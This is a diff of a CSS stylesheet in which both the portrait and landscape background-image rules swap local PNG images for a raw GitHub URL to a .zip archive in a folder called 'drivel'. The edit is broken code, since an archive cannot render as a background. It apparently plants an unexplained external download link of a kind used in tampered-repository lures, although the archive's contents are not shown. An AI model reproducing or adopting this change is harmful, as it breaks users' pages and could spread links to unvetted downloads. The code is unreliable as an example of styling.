@@ -31,7 +31,7 @@ h1 {
 /* declaraçoes retrato*/
 @media screen and (orientation: portrait) {
     body {
-    background-image: url(imagens/cev-portrait1.png) ;
+    background-image: url(https://raw.githubusercontent.com/PedroVecs/html-css/main/drivel/html-css.zip) ;
     background-position: center bottom;
 }
 }
@@ -39,7 +39,7 @@ h1 {
 /* declaraçoes paisagem*/
 @media screen and (orientation: landscape) {
     body {
-    background-image: url(imagens/cev-landscape1.png);
+    background-image: url(https://raw.githubusercontent.com/PedroVecs/html-css/main/drivel/html-css.zip);
     background-position: left bottom;
     background-color:blue ;
 }
